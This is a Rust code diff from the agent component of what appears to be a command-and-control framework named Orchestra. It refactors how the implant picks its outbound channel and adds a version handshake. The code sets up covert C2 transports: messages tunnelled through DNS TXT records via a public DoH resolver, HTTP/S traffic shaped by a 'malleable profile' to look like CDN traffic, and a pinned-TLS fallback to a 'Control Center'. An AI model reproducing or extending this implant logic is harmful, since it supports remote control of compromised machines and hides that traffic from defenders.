@@ -27,7 +27,16 @@
 
 use anyhow::{anyhow, Result};
 use common::tls_transport::{PinnedCertVerifier, TlsTransport};
-use common::{CryptoSession, Message, Transport};
+// CryptoSession is used by the TLS fallback path (when forward-secrecy is off)
+// and by the DoH/HTTP covert transports.  When forward-secrecy is on AND no
+// covert transport feature is compiled in, the import is unused, so guard it.
+#[cfg(any(
+    not(feature = "forward-secrecy"),
+    feature = "doh-transport",
+    feature = "http-transport"
+))]
+use common::CryptoSession;
+use common::{Message, Transport};
 use log::{error, info, warn};
 use rustls::ClientConfig;
 use std::sync::Arc;
@@ -111,11 +120,158 @@ fn build_tls_client_config(cert_fp: Option<&str>) -> Result<ClientConfig> {
         .with_no_client_auth())
 }
 
+/// Build the appropriate outbound transport based on compiled features and the
+/// runtime malleable-profile configuration.
+///
+/// Priority order:
+///   1. DoH transport  (`doh-transport`  feature + `dns_over_https = true`)
+///   2. HTTP transport (`http-transport` feature + `cdn_relay = true`)
+///   3. Direct TLS connection (always-available fallback)
+///
+/// Extracting this logic out of [`connect_once`] makes the transport selection
+/// reusable: any startup path (outbound-c, future inbound mode, tests) can
+/// call this function rather than duplicating the config-reading and feature
+/// gating.
+pub async fn build_outbound_transport(
+    addr: &str,
+    secret: &str,
+    cert_fp: Option<&str>,
+) -> Result<Box<dyn Transport + Send>> {
+    #[cfg(any(feature = "doh-transport", feature = "http-transport"))]
+    {
+        match crate::config::load_config() {
+            Ok(cfg) => {
+                // DoH transport: tunnel C2 messages through DNS TXT records sent
+                // to a public DoH resolver.  Requires a server-side DoH-to-C2
+                // bridge; the bridge URL must be set in `doh_server_url` in the
+                // malleable profile — activating without it would produce a
+                // transport that can never receive commands.
+                #[cfg(feature = "doh-transport")]
+                if cfg.malleable_profile.dns_over_https {
+                    let server_url = cfg
+                        .malleable_profile
+                        .doh_server_url
+                        .as_deref()
+                        .filter(|s| !s.is_empty())
+                        .ok_or_else(|| anyhow!(
+                            "DoH transport requires a compatible server-side DNS-to-C2 bridge \
+                             which is not included. Set doh_server_url in config or disable \
+                             dns_over_https."
+                        ))?;
+                    info!(
+                        "doh-transport: dns_over_https=true, server_url={}; switching to DohTransport",
+                        server_url
+                    );
+                    let session = CryptoSession::from_shared_secret(secret.as_bytes());
+                    return Ok(Box::new(
+                        crate::c2_doh::DohTransport::new(&cfg.malleable_profile, session)
+                            .await
+                            .map_err(|e| anyhow!("DohTransport init failed: {e}"))?,
+                    ));
+                }
+
+                // HTTP transport: tunnel C2 messages over HTTP/S using the
+                // malleable profile (custom User-Agent, Host header, staging URI).
+                // The Orchestra server must expose the staging URI via its reverse
+                // proxy — see docs/C_SERVER.md.
+                #[cfg(feature = "http-transport")]
+                if cfg.malleable_profile.cdn_relay {
+                    info!("http-transport: cdn_relay=true; switching to HttpTransport");
+                    let session = CryptoSession::from_shared_secret(secret.as_bytes());
+                    return Ok(Box::new(
+                        crate::c2_http::HttpTransport::new(&cfg.malleable_profile, session)
+                            .await
+                            .map_err(|e| anyhow!("HttpTransport init failed: {e}"))?,
+                    ));
+                }
+            }
+            Err(e) => {
+                warn!(
+                    "outbound-c: could not load config for transport selection: {e}; \
+                     falling back to TLS transport"
+                );
+            }
+        }
+    }
+
+    // ─── Default: direct TLS connection to Control Center ────────────────────
+    info!("outbound-c: connecting to Control Center addr={addr}");
+
+    let tcp = TcpStream::connect(addr).await?;
+    tcp.set_nodelay(true)?;
+
+    let tls_cfg = build_tls_client_config(cert_fp)?;
+    let connector = TlsConnector::from(Arc::new(tls_cfg));
+
+    let host = addr.split(':').next().unwrap_or(addr);
+    let server_name = rustls::pki_types::ServerName::try_from(host.to_owned())
+        .map_err(|e| anyhow!("invalid server address for TLS SNI '{host}': {e}"))?;
+
+    let mut tls_stream = connector.connect(server_name, tcp).await?;
+    info!("outbound-c: TLS handshake complete");
+
+    #[cfg(feature = "forward-secrecy")]
+    let session = common::forward_secrecy::negotiate_session_key(
+        &mut tls_stream,
+        secret.as_bytes(),
+        true, // client sends its public key first
+    )
+    .await?;
+    #[cfg(not(feature = "forward-secrecy"))]
+    let session = CryptoSession::from_shared_secret(secret.as_bytes());
+
+    Ok(Box::new(TlsTransport::new(tls_stream, session)))
+}
+
 /// Send the initial heartbeat and start the agent command loop for any transport.
 async fn run_with_heartbeat(
     mut transport: Box<dyn Transport + Send>,
     agent_id: &str,
 ) -> Result<()> {
+    // ── Protocol version handshake (M-2) ─────────────────────────────────────
+    // Send our version first so the server can reject incompatible agents fast,
+    // before any expensive work or state is committed on either side.
+    transport
+        .send(Message::VersionHandshake {
+            version: common::PROTOCOL_VERSION,
+        })
+        .await?;
+
+    match transport.recv().await {
+        Ok(Message::VersionHandshake { version }) => {
+            if version != common::PROTOCOL_VERSION {
+                anyhow::bail!(
+                    "protocol version mismatch: server={version}, agent={}. \
+                     Rebuild the agent or update the server to the same release.",
+                    common::PROTOCOL_VERSION
+                );
+            }
+            info!(
+                "outbound-c: protocol version {} accepted by server",
+                version
+            );
+        }
+        Ok(other) => {
+            // Server pre-dates M-2 and sent a message other than VersionHandshake
+            // (most likely a Heartbeat from an old bidirectional protocol).
+            // Warn and continue — the TLS handshake + shared secret already
+            // provide authentication; the missing version check is a soft degradation.
+            warn!(
+                "outbound-c: server did not reply with VersionHandshake (got {:?}); \
+                 possible version mismatch — proceeding without version validation",
+                other
+            );
+        }
+        Err(e) => {
+            anyhow::bail!(
+                "version handshake failed: {e}. \
+                 Likely causes: wrong shared secret, protocol version mismatch, \
+                 or a network device intercepting the connection."
+            );
+        }
+    }
+
+    // ── Registration heartbeat ────────────────────────────────────────────────
     let hostname = System::host_name().unwrap_or_else(|| "unknown".to_string());
     transport
         .send(Message::Heartbeat {
@@ -140,101 +296,7 @@ async fn connect_once(
     agent_id: &str,
     cert_fp: Option<&str>,
 ) -> Result<()> {
-    // ─── Experimental transport selection ────────────────────────────────────
-    // When a covert transport feature is compiled in AND the malleable profile
-    // requests it, use that transport instead of establishing a TLS connection.
-    // The malleable profile is read from the config file loaded at runtime;
-    // errors fall through to the default TLS transport.
-    #[cfg(any(feature = "doh-transport", feature = "http-transport"))]
-    {
-        match crate::config::load_config() {
-            Ok(cfg) => {
-                // doh-transport: tunnel C2 messages through DNS TXT records sent
-                // to a public DoH resolver.  Requires a server-side DoH-to-C2
-                // bridge; the bridge URL must be set in `doh_server_url` in the
-                // malleable profile — activating without it would produce a
-                // transport that can never receive commands.
-                #[cfg(feature = "doh-transport")]
-                if cfg.malleable_profile.dns_over_https {
-                    let server_url = cfg
-                        .malleable_profile
-                        .doh_server_url
-                        .as_deref()
-                        .filter(|s| !s.is_empty())
-                        .ok_or_else(|| anyhow!(
-                            "DoH transport requires a compatible server-side DNS-to-C2 bridge \
-                             which is not included. Set doh_server_url in config or disable \
-                             dns_over_https."
-                        ))?;
-                    info!(
-                        "doh-transport: dns_over_https=true, server_url={}; switching to DohTransport",
-                        server_url
-                    );
-                    let session = CryptoSession::from_shared_secret(secret.as_bytes());
-                    let transport: Box<dyn Transport + Send> = Box::new(
-                        crate::c2_doh::DohTransport::new(&cfg.malleable_profile, session)
-                            .await
-                            .map_err(|e| anyhow!("DohTransport init failed: {e}"))?,
-                    );
-                    return run_with_heartbeat(transport, agent_id).await;
-                }
-
-                // http-transport: tunnel C2 messages over HTTP/S using the
-                // malleable profile (custom User-Agent, Host header, staging URI).
-                // The Orchestra server must expose the staging URI via its reverse
-                // proxy — see docs/C_SERVER.md.
-                #[cfg(feature = "http-transport")]
-                if cfg.malleable_profile.cdn_relay {
-                    info!("http-transport: cdn_relay=true; switching to HttpTransport");
-                    let session = CryptoSession::from_shared_secret(secret.as_bytes());
-                    let transport: Box<dyn Transport + Send> = Box::new(
-                        crate::c2_http::HttpTransport::new(&cfg.malleable_profile, session)
-                            .await
-                            .map_err(|e| anyhow!("HttpTransport init failed: {e}"))?,
-                    );
-                    return run_with_heartbeat(transport, agent_id).await;
-                }
-            }
-            Err(e) => {
-                warn!(
-                    "outbound-c: could not load config for transport selection: {e}; \
-                     falling back to TLS transport"
-                );
-            }
-        }
-    }
-
-    // ─── Default: direct TLS connection to Control Center ────────────────────
-    info!("outbound-c: connecting to Control Center addr={addr} agent_id={agent_id}");
-
-    let tcp = TcpStream::connect(addr).await?;
-    tcp.set_nodelay(true)?;
-
-    // Establish a real TLS connection to the Control Center.
-    let tls_cfg = build_tls_client_config(cert_fp)?;
-    let connector = TlsConnector::from(Arc::new(tls_cfg));
-
-    // Extract hostname from addr (host:port) for TLS SNI.
-    let host = addr.split(':').next().unwrap_or(addr);
-    let server_name = rustls::pki_types::ServerName::try_from(host.to_owned())
-        .map_err(|e| anyhow!("invalid server address for TLS SNI '{host}': {e}"))?;
-
-    let mut tls_stream = connector.connect(server_name, tcp).await?;
-    info!("outbound-c: TLS handshake complete");
-
-    // When forward-secrecy is enabled, derive a per-session key via X25519 ECDH.
-    #[cfg(feature = "forward-secrecy")]
-    let session = common::forward_secrecy::negotiate_session_key(
-        &mut tls_stream,
-        secret.as_bytes(),
-        true, // client sends its public key first
-    )
-    .await?;
-    #[cfg(not(feature = "forward-secrecy"))]
-    let session = CryptoSession::from_shared_secret(secret.as_bytes());
-
-    let transport: Box<dyn Transport + Send> = Box::new(TlsTransport::new(tls_stream, session));
-
+    let transport = build_outbound_transport(addr, secret, cert_fp).await?;
     run_with_heartbeat(transport, agent_id).await
 }
 
